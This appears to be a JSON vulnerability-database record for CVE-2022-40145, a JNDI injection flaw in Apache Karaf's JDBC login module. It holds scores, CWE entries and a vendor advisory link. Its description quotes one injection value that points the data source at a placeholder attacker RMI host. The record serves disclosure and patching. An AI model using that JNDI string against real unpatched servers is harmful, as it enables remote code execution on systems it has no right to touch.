{"CVE Code": "CVE-2022-40145", "Description": "This vulnerable is about a potential code injection when an attacker has control of the target LDAP server using in the JDBC JNDI URL. The function jaas.modules.src.main.java.porg.apache.karaf.jass.modules.jdbc.JDBCUtils#doCreateDatasource use InitialContext.lookup(jndiName) without filtering. An user can modify `options.put(JDBCUtils.DATASOURCE, \"osgi:\" + DataSource.class.getName());` to `options.put(JDBCUtils.DATASOURCE,\"jndi:rmi://x.x.x.x:xxxx/Command\");` in JdbcLoginModuleTest#setup. This is vulnerable to a remote code execution (RCE) attack when a configuration uses a JNDI LDAP data source URI when an attacker has control of the target LDAP server.This issue affects all versions of Apache Karaf up to 4.4.1 and 4.3.7. We encourage the users to upgrade to Apache Karaf at least 4.4.2 or 4.3.8", "NVD Link": "https://nvd.nist.gov/vuln/detail/CVE-2022-40145", "Vulnerability Categories": "Input validation;Execute code", "Affected Products": "\nApache\u00bbKarafVersions  from including (>=) 4.4.0andbefore (<) 4.4.2cpe:2.3:a:apache:karaf:*:*:*:*:*:*:*:*Matching versions\nApache\u00bbKarafVersions  before (<) 4.3.8cpe:2.3:a:apache:karaf:*:*:*:*:*:*:*:*Matching versions", "EPSS Score": "0.09% Probability of exploitation activity in the next 30 days\n~ 41 % Percentile, the proportion of vulnerabilities that are scored at or less", "EPSS History": "\n #  Date  Old EPSS Score  New EPSS Score  Delta (New - Old) \n 1  2024-12-17  0.09%  0.09%  +0.01 \n 2  2024-07-13  0.08%  0.09%  +0.01 \n 3  2024-01-23  0.07%  0.08%  +0.00 \n 4  2023-12-28  0.08%  0.07%  0.00 \n 5  2023-06-28  0.07%  0.08%  +0.00 \n 6  2023-03-07  1.16%  0.07%  -1.08 ", "CVSS Scores": "9.8", "CWE": [{"CWE_ID": "CWE-20 Improper Input Validation", "CWE_link": "/cwe-details/20/Improper-Input-Validation.html"}, {"CWE_ID": "CWE-74 Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')", "CWE_link": "/cwe-details/74/Improper-Neutralization-of-Special-Elements-in-Output-Used-b.html"}], "Reference": [{"ref_link": "https://karaf.apache.org/security/cve-2022-40145.txt", "ref_desc": "Vendor Advisory", "ref_cve_link": "N/A"}]}